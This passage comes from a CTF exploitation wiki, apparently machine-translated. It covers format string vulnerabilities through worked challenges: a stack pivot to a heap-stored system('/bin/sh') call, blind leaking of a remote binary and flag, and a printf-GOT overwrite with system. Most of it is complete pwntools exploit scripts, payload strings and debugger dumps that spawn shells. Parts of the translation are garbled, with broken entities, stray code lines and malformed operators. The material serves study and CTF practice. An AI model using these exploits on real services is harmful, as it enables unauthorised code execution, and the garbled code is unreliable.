carefully, you can find a format string vulnerability when printing contact information. int __cdecl PrintInfo ( int a1 , int a2 , int a3 , char * format ) { printf ( \" \\t Name: %s \\n \" , a1 ); printf ( \" \\t Length %u \\n \" , a2 ); printf ( \" \\t Phone #: %s \\n \" , a3 ); printf ( \" \\t Description: \" ); return printf ( format ); } Take a closer look and you can see that this format actually points to the heap. Using ideas \u00b6 Our basic purpose is to get the system's shell and get the flag. In fact, since there is a format string vulnerability, we should be able to control the program flow by hijacking the got table or controlling the return address of the program. But it is not very feasible here. The reasons are as follows The reason why we can't hijack got to control the program flow is because we found that only the printf function that can be output to our given string is common in the program. We only have to select it to construct /bin/sh to execute it. ('/bin/sh'), but the printf function is also used elsewhere, which will cause the program to crash directly. Secondly, it is not possible to directly control the program return address to control the program flow because we do not have a directly executable address to store our contents, and use the format string to write directly to the stack system__addr + 'bbbb ' + addr of '/bin/sh' doesn't seem to be realistic. So what can we do? We also have the skills to talk about stack overflow before, stack pivoting. And here, what we can control happens to be heap memory, so we can move the stack to the heap. Here we use the leave command for stack migration, so before migration we need to modify the program to save the value of ebp to the value we want. Only then will esp become the value we want when we execute the leave instruction. At the same time, because we are using the format string to modify, so we have to know the address of the ebp store, and the address of the ebp stored in the PrintInfo function changes every time, and we can not know by other means. . However, the ebp value pushed into the stack in the program actually saves the address of the ebp value of the previous function , so we can modify the value of the saved ebp of the upper layer function, ie the upper upper layer function ( That is, the main function) ebp value . In this way, when the upper program returns, the operation of migrating the stack to the heap is implemented. The basic idea is as follows First get the address of the system function Determine by libc database by leaking the address of a libc function. Construct a basic contact description as system_addr + 'bbbb' + binsh_addr Modify the ebp saved by the upper function (ie the ebp of the upper layer function) to the address -** of the storage system_addr. When the main program returns, the following operations will occur move esp, ebp, point esp to the address of system_addr -4 pop ebp, point esp to system_addr ret, get the shell by pointing eip to system_addr. Get the relevant address and offset \u00b6 Here we mainly get the system function address, /bin/sh address, the address of the contact description stored on the stack, and the address of the PrintInfo function. First, we get the system function address and /bin/sh address according to the libc_start_main_ret address stored on the stack (which is the function that will run when the main function returns). We construct the corresponding contact, then choose to output the contact information, and breakpoints at printf, and run until the printf function of the format string vulnerability, as follows \u2192 0xf7e44670 <printf+0> call 0xf7f1ab09 <__x86.get_pc_thunk.ax> \u21b3 0xf7f1ab09 <__x86.get_pc_thunk.ax+0> mov eax, DWORD PTR [ esp ] 0xf7f1ab0c <__x86.get_pc_thunk.ax+3> ret 0xf7f1ab0d <__x86.get_pc_thunk.dx+0> mov edx, DWORD PTR [ esp ] 0xf7f1ab10 <__x86.get_pc_thunk.dx+3> ret \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500 [ stack ] \u2500\u2500\u2500\u2500 [ '0xffffccfc' , 'l8' ] 8 0xffffccfc\u2502+0x00: 0x08048c27 \u2192 leave \u2190 $esp 0xffffcd00\u2502+0x04: 0x0804c420 \u2192 \"1234567\" 0xffffcd04\u2502+0x08: 0x0804c410 \u2192 \"11111\" 0xffffcd08\u2502+0x0c: 0xf7e5acab \u2192 <puts+11> add ebx, 0x152355 0xffffcd0c\u2502+0x10: 0x00000000 0xffffcd10\u2502+0x14: 0xf7fad000 \u2192 0x001b1db0 0xffffcd14\u2502+0x18: 0xf7fad000 \u2192 0x001b1db0 0xffffcd18\u2502+0x1c: 0xffffcd48 \u2192 0xffffcd78 \u2192 0x00000000 \u2190 $ebp \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500 [ trace ] \u2500\u2500\u2500\u2500 [ #0] 0xf7e44670 \u2192 Name: __printf(format=0x804c420 \"1234567\\n\") [ #1] 0x8048c27 \u2192 leave [ #2] 0x8048c99 \u2192 add DWORD PTR [ebp-0xc], 0x1 [ # 3] 0x80487a2 \u2192 jmp 0x80487b3 [ #4] 0xf7e13637 \u2192 Name: __libc_start_main(main=0x80486bd, argc=0x1, argv=0xffffce14, init=0x8048df0, fini=0x8048e60, rtld_fini=0xf7fe88a0 <_dl_fini>, stack_end=0xffffce0c) [ # 5] 0x80485e1 \u2192 holds \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500 gef\u27a4 dereference $esp 140 [ '$esp' , '140' ] 1 0xffffccfc\u2502+0x00: 0x08048c27 \u2192 leave \u2190 $esp gef\u27a4 dereference $esp l140 [ '$esp' , 'l140' ] 140 0xffffccfc\u2502+0x00: 0x08048c27 \u2192 leave \u2190 $esp 0xffffcd00\u2502+0x04: 0x0804c420 \u2192 \"1234567\" 0xffffcd04\u2502+0x08: 0x0804c410 \u2192 \"11111\" 0xffffcd08\u2502+0x0c: 0xf7e5acab \u2192 <puts+11> add ebx, 0x152355 0xffffcd0c\u2502+0x10: 0x00000000 0xffffcd10\u2502+0x14: 0xf7fad000 \u2192 0x001b1db0 0xffffcd14\u2502+0x18: 0xf7fad000 \u2192 0x001b1db0 0xffffcd18\u2502+0x1c: 0xffffcd48 \u2192 0xffffcd78 \u2192 0x00000000 \u2190 $ebp 0xffffcd1c\u2502+0x20: 0x08048c99 \u2192 add DWORD PTR [ ebp-0xc ] , 0x1 0xffffcd20\u2502+0x24: 0x0804b0a8 \u2192 \"11111\" 0xffffcd24\u2502+0x28: 0x00002b67 ( \"g+\" ? ) 0xffffcd28\u2502+0x2c: 0x0804c410 \u2192 \"11111\" 0xffffcd2c\u2502+0x30: 0x0804c420 \u2192 \"1234567\" 0xffffcd30\u2502+0x34: 0xf7fadd60 \u2192 0xfbad2887 0xffffcd34\u2502+0x38: 0x08048ed6 \u2192 0x25007325 ( \"%s\" ? ) 0xffffcd38\u2502+0x3c: 0x0804b0a0 \u2192 0x0804c420 \u2192 \"1234567\" 0xffffcd3c\u2502+0x40: 0x00000000 0xffffcd40\u2502+0x44: 0xf7fad000 \u2192 0x001b1db0 0xffffcd44\u2502+0x48: 0x00000000 0xffffcd48\u2502+0x4c: 0xffffcd78 \u2192 0x00000000 0xffffcd4c\u2502 + 0x50: 0x080487a2 \u2192 jmp 0x80487b3 0xffffcd50\u2502+0x54: 0x0804b0a0 \u2192 0x0804c420 \u2192 \"1234567\" 0xffffcd54\u2502+0x58: 0xffffcd68 \u2192 0x00000004 0xffffcd58\u2502+0x5c: 0x00000050 ( \"P\" ? ) 0xffffcd5c\u2502+0x60: 0x00000000 0xffffcd60\u2502+0x64: 0xf7fad3dc \u2192 0xf7fae1e0 \u2192 0x00000000 0xffffcd64\u2502+0x68: 0x08048288 \u2192 0x00000082 0xffffcd68\u2502+0x6c: 0x00000004 0xffffcd6c\u2502+0x70: 0x0000000a 0xffffcd70\u2502+0x74: 0xf7fad000 \u2192 0x001b1db0 0xffffcd74\u2502+0x78: 0xf7fad000 \u2192 0x001b1db0 0xffffcd78\u2502+0x7c: 0x00000000 0xffffcd7c\u2502+0x80: 0xf7e13637 \u2192 <__libc_start_main+247> add esp, 0x10 0xffffcd80\u2502+0x84: 0x00000001 0xffffcd84\u2502+0x88: 0xffffce14 \u2192 0xffffd00d \u2192 \"/mnt/hgfs/Hack/ctf/ctf-wiki/pwn/fmtstr/example/201[...]\" 0xffffcd88\u2502+0x8c: 0xffffce1c \u2192 0xffffd058 \u2192 \"XDG_SEAT_PATH=/org/freedesktop/DisplayManager/Seat[...]\" We can get it by simple judgment. 0xffffcd7c\u2502+0x80: 0xf7e13637 \u2192 <__libc_start_main+247> add esp, 0x10 Stored is the return address of __libc_start_main, and uses fmtarg to get the corresponding offset. It can be seen that the offset is 32, then the offset from the format string is 31. gef\u27a4 fmtarg 0xffffcd7c The index of format argument : 32 This way we can get the corresponding address. In turn, you can get the corresponding libc according to libc-database, and then get the system function address and /bin/sh function address. Second, we can determine that the address 0xffffcd2c of the formatted string stored on the stack is 11 relative to the format string, which is used to construct our contacts. Furthermore, we can see that the following address holds the call address of the upper function, and its offset from the format string is 6, so that we can directly modify the value of ebp stored in the upper function. 0xffffcd18\u2502+0x1c: 0xffffcd48 \u2192 0xffffcd78 \u2192 0x00000000 \u2190 $ebp Constructing a contact to get the heap address \u00b6 After learning the above information, we can use the following method to get the heap address and the corresponding ebp address. [system_addr][bbbb][binsh_addr][%6$p][%11$p][bbbb] To get the corresponding corresponding address. The latter bbbb is for the convenience of accepting strings. Here, because the stack space requested by the function is the same as the free space, the ebp address we get will not change because we call it again. In some environments, the system address will appear \\x00, causing 0 truncation when printf will result in the inability to disclose both addresses, so you can modify the payload as follows: [%6$p][%11$p][ccc][system_addr][bbbb][binsh_addr][dddd] If the payload is modified to do this, you need to add a 12 offset to the heap. This ensures that the 0 truncation occurs after the leak. Modify ebp \u00b6 Since we need to execute the move command to assign ebp to esp and also need to execute pop ebp to execute the ret instruction, we need to modify ebp to store the value of system address -4. After pop ebp, the esp happens to point to the address of the save system, and the system function can be executed by executing the ret instruction. We have already learned the ebp value we want to modify, and we know that the corresponding offset is 6, so we can construct the following payload to modify the corresponding value. part1 = (heap_addr - 4) / 2 part2 = heap_addr - 4 - part1 payload = '%' + str(part1) + 'x%' + str(part2) + 'x%6$n' Get the shell \u00b6 At this time, after executing the format string function, exit to the upper function, we enter 5, exit the program will execute the ret instruction, you can get the shell. Using the program \u00b6 from pwn import * from LibcSearcher import * contact = ELF ( './contacts' ) ##context.log_level = 'debug' if args [ 'REMOTE' ]: sh = remote ( 11 , 111 ) else : sh = process ( './contacts' ) def createcontact ( name , phone , descrip_len , description ): sh . recvuntil ( & #39;&gt;&gt;&gt;&#39;) sh . sendline ( '1' ) sh . recvuntil ( 'Contact info: \\n ' ) sh . recvuntil ( 'Name: ' ) sh . sendline ( name ) sh . recvuntil ( 'You have 10 numbers \\n ' ) sh . sendline ( phone ) sh . recvuntil ( 'Length of description: ' ) sh . sendline ( descrip_len ) sh . recvuntil ( 'description: \\n\\t\\t ' ) sh . sendline ( description ) def printcontact (): sh . recvuntil ( & #39;&gt;&gt;&gt;&#39;) sh . sendline ( '4' ) sh . recvuntil ( 'Contacts:' ) sh . recvuntil ( 'Description: ' ) ## get system addr & binsh_addr payload = & #39;% 31 $ paaaa&#39; createcontact ( '1111' , '1111' , '111' , payload ) print contact () libc_start_main_ret = int ( sh . recvuntil ( 'aaaa' , drop = True ), 16 ) log . success ( 'get libc_start_main_ret addr: ' + hex ( libc_start_main_ret )) libc = LibcSearcher ( '__libc_start_main_ret' , libc_start_main_ret ) libc_base = libc_start_main_ret - libc . dump ( '__libc_start_main_ret' ) system_addr = libc_base + libc . dump ( 'system' ) binsh_addr = libc_base + libc . dump ( 'str_bin_sh' ) log . success ( 'get system addr: ' + hex ( system_addr )) log . success ( 'get binsh addr: ' + hex ( binsh_addr )) ##gdb.attach(sh) ## get heap addr and ebp addr payload = flat ([ system_addr , & #39;yyyah&#39;, binsh_addr , '%6$p%11$pcccc' , ]) createcontact ( '2222' , '2222' , '222' , payload ) print contact () sh . recvuntil ( 'Description: ' ) data = sh . recvuntil ( 'cccc' , drop = True ) data = data . split ( '0x' ) print data ebp_addr = int ( data [ 1 ], 16 ) heap_addr = int ( data [ 2 ], 16 ) ## modify ebp part1 = ( heap_addr - 4 ) / 2 part2 = heap_addr - 4 - part1 payload = '%' + str ( part1 ) + 'x%' + str ( part2 ) + 'x%6$n' ##print payload createcontact ( '3333' , '123456789' , '300' , payload ) print contact () sh . recvuntil ( 'Description: ' ) sh . recvuntil ( 'Description: ' ) ##gdb.attach(sh) print 'get shell' sh . recvuntil ( & #39;&gt;&gt;&gt;&#39;) ##get shell sh . sendline ( '5' ) sh . interactive () In the case of system 0 truncation, exp is as follows: from pwn import * context . log_level = \"debug\" context . arch = \"x86\" io = process ( \"./contacts\" ) binary = ELF ( \"contacts\" ) libc = binary . libc def createcontact ( io , name , phone , descrip_len , description ): I sh = sh . recvuntil ( & #39;&gt;&gt;&gt;&#39;) sh . sendline ( '1' ) sh . recvuntil ( 'Contact info: \\n ' ) sh . recvuntil ( 'Name: ' ) sh . sendline ( name ) sh . recvuntil ( 'You have 10 numbers \\n ' ) sh . sendline ( phone ) sh . recvuntil ( 'Length of description: ' ) sh . sendline ( descrip_len ) sh . recvuntil ( 'description: \\n\\t\\t ' ) sh . sendline ( description ) def printcontact ( io ): I sh = sh . recvuntil ( & #39;&gt;&gt;&gt;&#39;) sh . sendline ( '4' ) sh . recvuntil ( 'Contacts:' ) sh . recvuntil ( 'Description: ' ) # Gdb.attach (I) createcontact ( io , & quot ; 1 & quot ;, & quot ; 1 & quot ;, & quot ; 111 & quot ;, & quot ; % 31 $ paaaa & quot ;) printcontact ( I ) libc_start_main = int ( io . recvuntil ( 'aaaa' , drop = True ), 16 ) - 241 log . success ( 'get libc_start_main addr: ' + hex ( libc_start_main )) libc_base = libc_start_main - libc . symbols [ \"__libc_start_main\" ] system = libc_base + libc . symbols [ \"system\" ] binsh = libc_base + next ( libc . search ( \"/bin/sh\" )) log . success ( \"system: \" + hex ( system )) log . success ( \"binsh: \" + hex ( binsh )) payload = '%6$p%11$pccc' + p32 ( system ) + 'bbbb' + p32 ( binsh ) + \"dddd\" createcontact ( io , '2' , '2' , '111' , payload ) printcontact ( I ) io . recvuntil ( & #39;Description:&#39;) data = io . recvuntil ( 'ccc' , drop = True ) data = data . split ( '0x' ) print data ebp_addr = int ( data [ 1 ], 16 ) heap_addr = int ( data [ 2 ], 16 ) + 12 log . success ( \"ebp: \" + hex ( system )) log . success ( \"heap: \" + hex ( heap_addr )) part1 = ( heap_addr - 4 ) / 2 part2 = heap_addr - 4 - part1 payload = '%' + str ( part1 ) + 'x%' + str ( part2 ) + 'x%6$n' #payload=fmtstr_payload(6,{ebp_addr:heap_addr}) ##print payload createcontact ( io , '3333' , '123456789' , '300' , payload ) printcontact ( I ) io . recvuntil ( & #39;Description:&#39;) io . recvuntil ( & #39;Description:&#39;) ##gdb.attach(sh) log . success ( \"get shell\" ) io . recvuntil ( & #39;&gt;&gt;&gt;&#39;) ##get shell io . sendline ( & #39;5&#39;) io . interactive () It should be noted that this does not stabilize the shell because we have entered a string that is too long. But we have no way to control the address we want to enter in the front. It can only be this way. Why do you need to print so much? Because the format string is not on the stack, even if we get the address of the ebp that needs to be changed, there is no way to write this address to the stack, use the $ symbol to locate him; because there is no way to locate, there is no way to use l \\ll and other ways to write this address, so only print a lot. Format string blind hit \u00b6 Principle \u00b6 The so-called format string blind typing means that only the interactive ip address and port are given. The corresponding binary file is not given to let us perform pwn. In fact, this is similar to BROP, but BROP uses stack overflow, and here We are using a format string vulnerability. In general, we follow the steps below Determine the number of bits in the program Identify the location of the vulnerability -Use Since I didn't find the source code after the game, I simply constructed two questions. Example 1 - Leaking Stack \u00b6 Both the source and deployment files are placed in the corresponding folder [fmt_blind_stack] ( https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/fmtstr/blind_fmt_stack ). Determine the number of programs \u00b6 We randomly entered %p and the program echoed the following information. \u279c blind_fmt_stack git: ( master ) \u2717 nc localhost 9999 %p 0x7ffd4799beb0 G\ufffdflag is on the stack% Tell us that the flag is on the stack and that the program is 64-bit and that there should be a format string vulnerability. Use \u00b6 Then let's take a little test and see from pwn import * context . log_level = 'error' def leak ( payload ): sh = remote ( '127.0.0.1' , 9999 ) sh . sendline ( payload ) data = sh . recvuntil ( ' \\n ' , drop = True ) if data . startswith ( '0x' ): print p64 ( int ( data , 16 )) sh . close () i = 1 while 1 : payload = '% {} $p' . format ( i ) leak ( payload ) i += 1 Finally, I simply looked at the output and got the flag. //////// //////// \\x 00 \\x 00 \\x 00 \\x 00 \\x 00 \\x 00 \\x 00 \\x ff flag { exam s_is_fla g } \\x 00 \\x 00 \\x 00 \\x 00 \\x 00 \\x 00 \\x 00 \\x 00 \\x 00 \\x 00 \\x fe \\x 7f \\x 00 \\x 00 Example 2 - Blind hijacking got \u00b6 The source code and deployment files are already in the blind_fmt_got folder. Determine the number of programs \u00b6 By simply testing, we found that this program is a format string vulnerability function, and the program is 64-bit. \u279c blind_fmt_got git: ( master ) \u2717 nc localhost 9999 %p 0x7fff3b9774c0 This time, I didn't show it back. I tried it again and found that there was nothing wrong with it. Then we had to leak a wave of source programs. Determining the offset \u00b6 Before the leak procedure, we still have to determine the offset of the format string, as follows \u279c blind_fmt_got git: ( master ) \u2717 nc localhost 9999 aaaaaaaa%p%p%p%p%p%p%p%p%p aaaaaaaa0x7ffdbf920fb00x800x7f3fc9ccd2300x4006b00x7f3fc9fb0ab00x61616161616161610x70257025702570250x70257025702570250xa7025 Based on this, we can know that the starting address offset of the format string is 6. leaking binary \u00b6 Since the program is 64-bit, we started leaking from 0x400000. In general, blind typing with a format string vulnerability can be read into the '\\x00' character, otherwise it can't be revealed how to play, after that, the output must be truncated by '\\x00', this is because The output functions of the format string exploit are truncated by '\\x00'. . So we can use the leak code below. ##coding=utf8 from pwn import * ##context.log_level = 'debug' ip = \"127.0.0.1\" port = 9999 def leak ( addr ): # leak addr for three times num = 0 while num < 3 : try : print 'leak addr: ' + hex ( addr ) sh = remote ( ip , port ) payload = '%00008$s' + 'STARTEND' + p64 ( addr ) #\u8bf4\u660e\u6709\\n, a new line appears if ' \\x0a ' in payload : return None sh . sendline ( payload ) data = sh . recvuntil ( 'STARTEND' , drop = True ) sh . close () return data except Exception : num + = 1 continue return None def getbinary (): addr = 0x400000 f = open ( 'binary' , 'w' ) while addr < 0x401000 : data = leak ( addr ) if data is None : f . write ( ' \\xff ' ) addr += 1 elif len ( data ) == 0 : f . write ( ' \\x00 ' ) addr += 1 else : f . write ( data ) addr + = len ( data ) f . close () getbinary () It should be noted that in the payload, it is necessary to judge whether or not '\\n' appears, because this will cause the source program to read only the previous content, and there is no way to leak the memory, so it is necessary to skip such an address. \u5206\u6790\u658cary \u00b6 Use IDA to open the leaked binary, change the program base address, and then simply look at it, you can basically determine the address of the source program main function. ` asm seg000:00000000004005F6 push rbp seg000:00000000004005F7 mov rbp, rsp seg000:00000000004005FA add rsp, 0FFFFFFFFFFFFFF80h seg000:00000000004005FE seg000:00000000004005FE loc_4005FE: ; CODE XREF: seg000:0000000000400639\u0019j seg000:00000000004005FE lea rax, [rbp-80h] seg000:0000000000400602 mov edx, 80h ; '\u20ac' seg000:0000000000400607 mov rsi, rax seg000: 000000000040060A mov edi, 0 seg000:000000000040060F mov eax, 0 seg000:0000000000400614 call sub_4004C0 seg000:0000000000400619 lea rax, [rbp-80h] seg000: 000000000040061D mov rdi, rax seg000:0000000000400620 mov eax, 0 seg000:0000000000400625 call sub_4004B0 seg000:000000000040062A mov rax, cs:601048h seg000: 0000000000400631 mov rdi, rax seg000:0000000000400634 call near ptr unk_4004E0 seg000:0000000000400639 jmp short loc_4005FE It can be basically determined that sub\\_4004C0 is a read function, because the read function has a total of three parameters, which is basically read. In addition, the sub\\_4004B0 called below should be the output function, and then a function should be called again, and then jump back to the read function, the program should be a while 1 loop, always executing. #### Using ideas After analyzing the above, we can determine the following basic ideas - leak the address of the printf function, - Get the corresponding libc and system function address - Modify printf address to system function address - Read /bin/sh; to get the shell #### Using the program The procedure is as follows. ```python ##coding=utf8 import math from pwn import * from LibcSearcher import LibcSearcher ##context.log_level = 'debug' context.arch = 'amd64' ip = \"127.0.0.1\" port = 9999 def leak(addr): # leak addr for three times num = 0 while num < 3: try: print 'leak addr: ' + hex(addr) sh = remote(ip, port) payload = '%00008$s' + 'STARTEND' + p64(addr) #\u8bf4\u660e\u6709\\n, a new line appears if '\\x0a' in payload: return None sh.sendline(payload) data = sh.recvuntil('STARTEND', drop=True) sh.close() return data except Exception: num + = 1 continue return None def getbinary(): addr = 0x400000 f = open('binary', 'w') while addr < 0x401000: data = leak(addr) if data is None: f.write('\\xff') addr += 1 elif len (data) == 0: f.write('\\x00') addr += 1 else: f.write(data) addr + = len (data) f.close() ##getbinary() read_got = 0x601020 printf_got = 0x601018 sh = remote(ip, port) ## let the read get resolved sh.sendline('a') sh.recv() ## get printf addr payload = '%00008$s' + 'STARTEND' + p64(read_got) sh.sendline(payload) data = sh.recvuntil (&#39;STARTEND&#39;, drop = True) .ljust (8, &#39;x00&#39;) sh.recv() read_addr = u64(data) ## get system addr libc = LibcSearcher('read', read_addr) libc_base = read_addr - libc.dump('read') system_addr = libc_base + libc.dump('system') log.success('system addr: ' + hex(system_addr)) log.success('read addr: ' + hex(read_addr)) ## modify printf_got payload = fmtstr_payload(6, {printf_got: system_addr}, 0, write_size='short') ## get all the addr addr = payload[:32] payload = '%32d' + payload[32:] offset = (int)(math.ceil(len(payload) / 8.0) + 1) for i in range(6, 10): old = '%{}$'.format(i) new = '%{}$'.format(offset + i) payload = payload.replace(old, new) remainer = len(payload) % 8 payload += (8 - remainer) * 'a' payload += addr sh.sendline(payload) sh.recv() ## get shell sh.sendline('/bin/sh;') sh.interactive() What needs to be noted here is this code. ## modify printf_got payload = fmtstr_payload ( 6 , { printf_got : system_addr }, 0 , write_size = 'short' ) ## get all the addr addr = payload [: 32 ] payload = ' %32d ' + payload [ 32 :] offset = ( int )( math . ceil ( len ( payload ) / 8.0 ) + 1 ) for i in range ( 6 , 10 ): old = '% {} $' . format ( i ) new = '% {} $' . format ( offset + i ) payload = payload . replace ( old , new ) remainer = len ( payload ) % 8 payload += ( 8 - remainer ) * 'a' payload += addr sh . sendline ( payload ) sh . recv () Fmtstr_payload directly get the payload will put the address in front, and this will lead to '\\x00' truncation of printf ( About this problem, pwntools is currently developing an enhanced version of fmt_payload, it is estimated that it will be developed soon ). So I used some tricks to put it behind. The main idea is to place the address in the 8 byte alignment and modify the offset in the payload. have to be aware of is offset = ( int )( math . ceil ( len ( payload ) / 8.0 ) + 1 ) This line gives the offset of the modified address in the formatted string. The reason for this is that no matter how it is modified, the more characters in the order of '%order$hn' will not be greater than 8. Specific can be deduced by yourself. Title \u00b6 SuCTF2018 - lock2 (The organizer provided the docker image: suctf/2018-pwn-lock2)","title":"Format String Vulnerability Example"},{"location":"pwn/linux/fmtstr/fmtstr_example/#format-string-vulnerability-example","text":"The following is a description of some of the formatting vulnerabilities in the CTF. It is also a common use of formatted strings.","title":"Format string vulnerability example"},{"location":"pwn/linux/fmtstr/fmtstr_example/#64-bit-program-format-string-vulnerability","text":"","title":"64-bit program format string vulnerability"},{"location":"pwn/linux/fmtstr/fmtstr_example/#principle","text":"In fact, the 64-bit offset calculation is similar to 32-bit, which is the corresponding parameter. Only the first six parameters of the 64-bit function are stored in the corresponding registers. So in the format string vulnerability? Although we did not put data into the corresponding registers, the program will still parse the format according to the format of the format string.","title":"Principle"},{"location":"pwn/linux/fmtstr/fmtstr_example/#examples","text":"Here, we introduce the [pwn200 GoodLuck] ( https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/fmtstr/2017-UIUCTF-pwn200-GoodLuck ) in UIUCTF in 2017 as an example. . Since there is only a local environment, I have set a flag.txt file locally.","title":"Examples"},{"location":"pwn/linux/fmtstr/fmtstr_example/#determining-protection","text":"\u279c 2017 -UIUCTF-pwn200-GoodLuck git: ( master ) \u2717 checksec goodluck Arch: amd64-64-little RELRO: Partial RELRO Stack: Canary found NX: NX enabled PIE: No PIE ( 0x400000 ) It can be seen that the program has NX protection and partial RELRO protection enabled.","title":"Determining protection"},{"location":"pwn/linux/fmtstr/fmtstr_example/#_1","text":"It can be found that the vulnerability of the program is obvious for ( j = 0 ; j <= 21 ; ++ j ) { v5 = format [ j ]; if ( ! v5 || v11 [ j ] != v5 ) { puts ( \"You answered:\" ); printf ( format ); puts ( \" \\n But that was totally wrong lol get rekt\" ); fflush ( _bss_start ); result = 0 ; goto LABEL_11 ; } }","title":"\u5206\u6790\u7a0b\u5e8f"},{"location":"pwn/linux/fmtstr/fmtstr_example/#determining-the-offset","text":"We offset the following at printf, here we only focus on the code part and the stack part. gef\u27a4 b printf Breakpoint 1 at 0x400640 gef\u27a4 r Starting program: /mnt/hgfs/Hack/ctf/ctf-wiki/pwn/fmtstr/example/2017-UIUCTF-pwn200-GoodLuck/goodluck what 's the flag 123456 You answered: Breakpoint 1, __printf (format=0x602830 \"123456\") at printf.c:28 28 printf.c: There is no such file or directory. \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500[ code:i386:x86-64 ]\u2500\u2500\u2500\u2500 0x7ffff7a627f7 <fprintf+135> add rsp, 0xd8 0x7ffff7a627fe <fprintf+142> right 0x7ffff7a627ff nop \u2192 0x7ffff7a62800 <printf+0> sub rsp, 0xd8 0x7ffff7a62807 <printf+7> test al, al 0x7ffff7a62809 <printf+9> mov QWORD PTR [rsp + 0x28], rsi 0x7ffff7a6280e <printf+14> mov QWORD PTR [rsp + 0x30], rdx \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500[ stack ]\u2500\u2500\u2500\u2500 [' 0x7fffffffdb08 ', ' l8 ' ] 8 0x00007fffffffdb08\u2502+0x00: 0x0000000000400890 \u2192 <main+234> mov edi, 0x4009b8 \u2190 $rsp 0x00007fffffffdb10\u2502+0x08: 0x0000000031000001 0x00007fffffffdb18\u2502+0x10: 0x0000000000602830 \u2192 0x0000363534333231 ( \"123456\" ? ) 0x00007fffffffdb20\u2502 + 0x18: 0x0000000000602010 \u2192 & quot ; You answered: \\ ng & quot ; 0x00007fffffffdb28\u2502+0x20: 0x00007fffffffdb30 \u2192 \"flag{11111111111111111\" 0x00007fffffffdb30\u2502+0x28: \"flag{11111111111111111\" 0x00007fffffffdb38\u2502+0x30: \"11111111111111\" 0x00007fffffffdb40\u2502+0x38: 0x0000313131313131 ( \"111111\" ? ) \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500 [ trace ] \u2500\u2500\u2500\u2500 [ #0] 0x7ffff7a62800 \u2192 Name: __printf(format=0x602830 \"123456\") [ #1] 0x400890 \u2192 Name: main() 